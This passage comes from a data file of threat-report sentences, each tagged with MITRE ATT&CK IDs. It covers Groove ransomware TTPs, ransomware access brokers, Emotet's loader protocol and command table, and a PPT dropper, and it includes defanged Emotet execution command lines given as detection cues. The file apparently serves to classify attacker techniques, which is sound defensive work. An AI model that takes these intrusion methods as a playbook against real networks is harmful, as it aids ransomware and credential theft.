"intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Then, on Sept. 3, the threat actor with the handle \u2018dyadka0220\u2019 stated that they were the principal developer of Babuk ransomware and posted what they claimed was the Babuk ransomware source code.", "labels": ["S0638", "S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "On Sept. 7, the Groove gang responded with a blog on their own website, titled \u201cThoughts about the meaning,\u201d which rhymes in Russian.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Additionally, their response alleges that the Groove gang never created the Babuk ransomware themselves, but worked with someone else to produce it.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The validity of the claims in Groove\u2019s latest blog is hard to determine, although this does not matter too much: the Babuk group, including affiliates, had a fallout that caused the group to break up, causing the retaliation of several (ex-)members.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The ATR team has covered Babuk multiple times.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The [second](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/babuk-biting-off-more-than-they-could-chew-by-aiming-to-encrypt-vm-and-nix-systems/) blog, published last July, dives into the ESXi version of the ransomware and its issues.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The group\u2019s tactics, techniques, and procedures (TTPs) are in-line with commonly observed techniques from ransomware actors.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Together with other vendors we have narrowed down some of the TTPs observed by the Groove gang.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "### Initial Access", "labels": ["TA0001"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The access can be bought, in terms of stolen (yet valid) credentials, or direct access in the form of a live backdoor on one or more of the victim\u2019s systems.", "labels": ["TA0006"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Alternatively, the actor can exploit publicly facing infrastructure using a known or unknown exploit.", "labels": ["T1190"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "To ATR\u2019s understanding, the latter has been used several times by exploiting vulnerable VPN servers.", "labels": ["T1190"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "### Lateral Movement, Discovery and Privilege Escalation", "labels": ["TA0008", "TA0007", "TA0004"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Moving around within the network is an important step for the actor, for two reasons.", "labels": ["T1135"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Firstly, it allows the attacker to find as much data as possible, which is then exfiltrated.", "labels": ["TA0010", "TA0009"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Secondly, access to all machines is required in order to deploy the ransomware at a later stage.", "labels": ["T1486", "TA0008", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "By encrypting numerous devices at once, it becomes even harder to control the damage from a defender\u2019s point of view.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The actor uses commonly known tools, such as [Ad-Find](https://www.joeware.net/freetools/tools/adfind/) and [NetScan](https://www.netscantools.com/index.html), to gather information on the network.", "labels": ["S0552", "T1046"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Based on the gathered information, the actor will move laterally through the network.", "labels": ["TA0008"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "To work with more than user-level privileges, the actor has a variety of options to escalate their privilege to a domain administrator.", "labels": ["TA0004"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Brute forcing RDP accounts, the dumping of credentials, and the use of *legacy* exploits such as EternalBlue (CVE-2017-0144), are ways to quickly obtain access to one or more privileged accounts.", "labels": ["T1110", "T1003", "T1068"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "### Data Exfiltration and Ransomware Deployment", "labels": ["TA0010", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The actor navigates through the machines on the network using the earlier obtained access.", "labels": ["TA0008"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "To exfiltrate the collected data, the attacker uses [WinSCP](https://winscp.net/eng/index.php).", "labels": ["TA0010"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Once all relevant data has been stolen, the attacker will execute the ransomware in bulk.", "labels": ["T1486", "TA0010", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "This can be done in a variety of ways, ranging from manually starting the ransomware on the targeted machines, scheduling a task per machine, or using [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) to launch the ransomware.", "labels": ["T1486", "T1053", "S0029", "T1486", "T1486", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "### Linking Groove to Babuk and BlackMatter", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "As discussed above, there was a fallout within Babuk.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "From that fallout, a part of the group stayed together to form Groove.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The server that Babuk used, which we will refer to as the \u201cwyyad\u201d server due to the ending of the onion URL, rebranded in late August 2021.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The changes to the landing page from Babuk to Groove", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Aside from this, data from old Babuk victims is still hosted on this server.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "All these victims have previously been claimed by (and attributed to) Babuk.", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Another gang, known as BlackMatter, uses a variety of locations to host their extorted files, which can be done out of convenience or to avoid a single notice and takedown to remove all offending files.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The data of one of the BlackMatter gang\u2019s victims, a Thai IT service provider, is stored on the \u201cwyyad\u201d server.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "As such, it can mean that the Groove gang worked as an affiliate for the BlackMatter gang.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The image below shows the BlackMatter leak website linking to the \u201cwyyad\u201d server.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Screenshot of BlackMatter, where the data is stored on the Groove server", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The Groove gang\u2019s website contains, at the time of writing, a single leak: data from a German printing company.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Another Groove victim but stored on their own page", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The affected company does not meet BlackMatter\u2019s \u201crequirements,\u201d the group has said it only goes after companies that make more than $US 100 million.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Posting on the Exploit forum by BlackMatter", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "The group\u2019s primary goal, making money, is not limited to ransomware.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Inversely, ransomware would be the cherry on top.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "This is yet another indication of the ransomware group\u2019s shift to a less hierarchical set-up and a more fluid and opportunistic network-based way of working.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "In the Groove Gang\u2019s blog on September 7, a reference is made with regards to BlackMatter, and its links to DarkSide.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "If true, these insights show that the Groove gang has insider knowledge of the BlackMatter gang.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "This makes the collaboration between Groove and BlackMatter more likely.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "If these claims are false, it makes one wonder as to why the Groove gang felt the need to talk about other gangs, since they seem to want to make a name for themselves.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Due to the above outlined actions ATR believes, with high confidence, that Groove is a former affiliate or subgroup of the Babuk gang, who are willing to collaborate with other parties, as long as there's financial gain for them.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Thus, an affiliation with the BlackMatter gang is likely.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Combined with underground forums banning ransomware actors, this created the perfect opportunity for the threat actor known as Orange to emerge, with the Groove gang in tow, with the offer of new ways of working where an associate\u2019s worth was based entirely on their ability to earn money.", "labels": ["T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Time will tell if this approach enhances the reputation of the Groove gang to the level of the cybercriminals they seem to admire.", "labels": [], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "One thing is clear though; with the manifestation of more self-reliant cybercrime groups the power balance within the RaaS ecosystem will change from he who controls the ransomware to he who controls the victim's networks.", "labels": ["T1486", "T1486"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "We have compiled a list of TTPs based on older Babuk cases and some recent cases linked to Groove:", "labels": ["S0638"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1190: Exploit Public-Facing Application (VPN services)", "labels": ["T1190"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1003: OS Credential Dumping", "labels": ["T1003"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1078.002: Valid Accounts: Domain Accounts", "labels": ["T1078"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1059: Command and Scripting Interpreter", "labels": ["T1059"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1021:002: SMB/Windows Admin Shares", "labels": ["T1021"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1210: Exploitation of Remote Services", "labels": ["T1210"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1087: Account Discovery", "labels": ["T1087"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1482: Domain Trust Discovery", "labels": ["T1482"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1562: Impair Defense", "labels": ["T1562"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1537: Transfer Data to Cloud Account", "labels": ["T1537"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "* T1567: Exfiltration Over Web Service", "labels": ["T1567"], "document": "intel471_2021-09-09_groove-gang-ransomware-babuk-revil"}, {"sentence": "Ransomware and RaaS groups have plagued organizations across different industry vectors.", "labels": ["T1486"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "From January 2021 to August 2021, we observed about 50 possible breach events for international government, national and regional governments that were ransomware-related, with about half of those incidents tied to RaaS programs.", "labels": ["T1486"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "Below is a graph that tallies the attacks and the RaaS affiliates tied to them:", "labels": ["T1486"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "The most attack of the measured time period was the DarkSide ransomware attack against Colonial Pipeline in May 2021.", "labels": ["T1486"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "As a result of the attention gained from this event, Intel 471 observed RaaS groups adjust their operations, which included new regulations on operators or affiliates targeting government entities.", "labels": ["T1486"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "Operators of several RaaS programs retreated from additional public focus, opting to maintain a low profile and prohibited their affiliates from targeting government organizations.", "labels": ["T1486"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "These changes were short lived: by June 2021 the REvil RaaS operators lifted previous bans and promised additional benefits to affiliates who were willing to attack any U.S.-based company or organization, which likely included government entities.", "labels": ["S0496", "T1486"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "Additionally, we observed increased sophistication in phishing pages over the same time period.", "labels": ["T1566"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "Intel 471 has observed three particular vulnerability types used as initial access vectors to compromise public sector networks: remote code execution (RCE), structured query language-injection (SQLi) and cross-site scripting (XSS).", "labels": ["TA0001", "T1190", "T1190", "T1189"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "These methods, which were used to gain initial access, were observed in breach events conducted by individual threat actors and RaaS operators.", "labels": ["TA0001", "T1486"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "In March 2021, an Italian-linked actor claimed on a popular cybercrime forum that they obtained access to a VMware ESXi cloud virtualization server that would grant someone access to municipalities in Eastern Europe.", "labels": ["T1195"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "In April 2021, we observed another actor offer to sell information about an SQLi vulnerability allegedly impacting resources belonging to a U.S.-based government entity in Colorado.", "labels": ["T1190"], "document": "intel471_2021-09-30_public-sector-cybersecurity-threats-2021"}, {"sentence": "These actors have obtained these credentials by leveraging well-known vulnerabilities in remote access solutions like Remote Desktop Protocol (RDP), VPN, Citrix, and SonicWall, among others.", "labels": ["T1212", "T1021"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "The new actor included the company\u2019s credentials in a dump of approximately 50 companies, allegedly all obtained via compromised Citrix, Cisco, virtual private network (VPN) and/or remote desktop protocol (RDP) accounts.", "labels": ["T1021"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "* **In August 2021**, one actor known to work with groups that have deployed Conti ransomware claimed access to corporate networks belonging to a U.S.-based transportation management and trucking software supplier and a U.S.-based commodity transportation services company.", "labels": ["S0575", "T1486"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "The group used the botnet to download and execute a Cobalt Strike beacon on infected machines, so group members in charge of breaching computer networks received access directly via a Cobalt Strike beacon session.", "labels": ["S0154", "S0154", "TA0002", "TA0001"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "* **In September 2021**, an actor with ties to the FiveHands ransomware group claimed access to hundreds of companies, including a U.K.-based logistics company.", "labels": ["S0618", "T1486"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "It\u2019s most likely that access was obtained through a SonicWall vulnerability, given that FiveHands is known to use that access to [launch its ransomware attacks](https://www.bleepingcomputer.com/news/security/new-ransomware-group-uses-sonicwall-zero-day-to-breach-networks/).", "labels": ["S0618", "T1486", "T1190"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "Additionally in September, a new actor claimed to have gained access to a Bangladesh-based shipping and logistics company through a vulnerability in the PulseSecure VPN.", "labels": ["T1190"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "The actor claimed he obtained the credentials through a path traversal vulnerability in Fortinet\u2019s FortiGate secure sockets layer (SSL) VPN web portal (CVE-2018-13379).", "labels": ["T1212"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "The NotPetya attack in 2017 devastated Danish shipping and maritime giant Maersk, [shutting down several of its ports](https://losangeles.cbslocal.com/2017/06/28/la-port-terminal-still-closed/) and costing the company $300 million to replace systems damaged by the malware.", "labels": ["S0368"], "document": "intel471_2021-11-02_shipping-companies-ransomware-credentials"}, {"sentence": "How the new Emotet differs from previous versions", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Last month, Intel 471 observed the emergence of Emotet, a notorious strain of malware that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021).", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "We wrote in January that \u201cOnly time will tell if the takedown will have a long-term impact on Emotet operations.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "While it took months to do, it looks like those behind Emotet have recovered.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "However, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol.", "labels": ["T1573"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Further investigation into Emotet\u2019s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Emotet is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users.", "labels": ["S0367", "TA0010"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "* A SPAM module", "labels": ["T1566"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "* Email credential stealer", "labels": ["TA0006", "T1114"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "* Outlook email address harvester", "labels": ["T1114"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "* Browser credential stealer", "labels": ["T1606"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "* Web-injector", "labels": ["T1189"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "* A module that allowed for brute-forcing credentials and lateral movement", "labels": ["TA0008", "T1110"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "In the short time that the malware has been active, Emotet has been heavily used to push malspam.", "labels": ["S0367", "T1566"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "labels": ["S0367", "T1566"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The image depicts an Emotet email lure.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.", "labels": ["S0367", "T1059"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states \u201cTHIS DOCUMENT IS PROTECTED,\u201d and instructs victims on how to enable macros.", "labels": ["S0367", "T1059", "T1059"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The image depicts an Emotet document lure.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Enabling macros will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader.", "labels": ["S0367", "T1059", "T1059"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "labels": ["T1566"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The document uses the following commands to spawn PowerShell and attempt to download and execute the malware:", "labels": ["T1059", "T1059"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity.", "labels": ["T1059", "S0367", "T1059", "T1218"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Many parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Emotet depends on `rundll32[.]exe` to execute, using the exported function \u201cControl\\\\_RunDLL\u201d as the main starting function.", "labels": ["S0367", "T1218"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.", "labels": ["S0367", "T1027"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet\u2019s past.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption.", "labels": ["S0367", "T1573"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "labels": ["T1573"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.", "labels": ["S0367", "T1573", "T1573"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "In addition to the changes to Emotet\u2019s cryptography, the communication protocol also saw some changes to each of the three \u201clayers\u201d necessary for communication.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Layer 1 (L1) contains the plaintext data sent to the command and control (C2).", "labels": ["TA0011", "TA0011", "TA0011"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "labels": ["TA0011"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Layer 3 (L3) is the encrypted data and contains the encrypted AES key, the encrypted data and some randomly generated data as padding.", "labels": ["T1573"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2.", "labels": ["S0367", "TA0011", "TA0011"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "However, the old protocol required the loader to also enumerate the victim\u2019s process list, which was sent to the C2 during check-in.", "labels": ["TA0011", "T1057", "T1041"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "labels": ["S0367", "T1057"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The following structure was observed for the new Emotet initial check-in:", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot\u2019s initial check-in.", "labels": ["S0367", "S0367", "TA0011", "TA0011"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "This module exclusively grabs the infected victim\u2019s process list, which is sent back to the C2 using the following L1:", "labels": ["TA0011", "T1057", "TA0010"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Emotet no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot.", "labels": ["S0367", "TA0011", "TA0010"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "labels": ["TA0011"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "L2 for Emotet\u2019s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "L3 for Emotet\u2019s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding.", "labels": ["S0367", "T1573", "T1573"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The randomly generated data has some interesting formatting performed on it that first replaces all nulls with `0xC3`.", "labels": ["T1001"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "In addition to protocol changes, Intel 471 analysts also observed changes to the new Emotet command table.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "| 2 | Load Module | Injects a module into memory.", "labels": ["T1055"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "| 3 | Execute EXE | Drops and executes executable.", "labels": ["TA0002", "TA0002"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "| 4 | Execute EXE as user | Drops and executes executable as a specific user.", "labels": ["TA0002", "TA0002"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "| 5 | Inject DLL with export | Injects a DLL into memory and maps and executes the export DllRegisterServer.", "labels": ["TA0002", "T1055", "T1055"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "| 6 | Execute dll with `regsvr32[.]exe` | Drops and executes DLL with `\u201cregsvr32[.]exe -s .\u201d`", "labels": ["TA0002", "T1218", "T1218"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "| 7 | Execute dll with `rundll32[.]exe` | Drops and executes DLL with `\u201crundll32[.]exe , Control\\_RunDLL.\u201d`", "labels": ["TA0002", "T1218", "T1218"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The update to the loader\u2019s command table gives Emotet much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family.", "labels": ["S0367", "S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "In the course of investigating the code, Intel 471 found two new distinct Emotet botnets.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Additionally, prior to Emotet\u2019s takedown, it had the following distinct botnets:", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "As Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "During the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses.", "labels": ["S0367", "T1566"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "The red box template in Image 2 is standard for Emotet documents.", "labels": ["S0367", "T1059"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "If that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.", "labels": ["T1059", "T1059", "T1218"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "While Emotet typically uses the export \u201cControl\\\\_RunDLL,\u201d looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "As Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Additionally, during various command executions, defenders can look for the following command lines to detect Emotet when it executes binaries.", "labels": ["S0367", "TA0002", "TA0002"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "However, Emotet will have installed at this point and a full investigation will be needed:", "labels": ["S0367"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "* `Regsvr32[.]exe -s `", "labels": ["T1218"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "* `Rundll32[.]exe , Control\\_RunDLL`", "labels": ["T1218"], "document": "intel471_2021-12-09_emotet-returns-december-2021"}, {"sentence": "Recently, a malware dropper received by mail has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries.", "labels": ["T1566"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "Firstly, it is characteristic that it lands on the victim in PPT format, while it has been much more common to find DOC or XLS extensions being used for this purpose.", "labels": ["T1566"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "The document has no content, but when you close the PPT viewer, the following window shows up:", "labels": ["T1204"], "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}, {"sentence": "This window is generated by the macros contained in the On\\_Close function, which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions.", "labels": ["T1059", "T1497", "T1204"], "document": 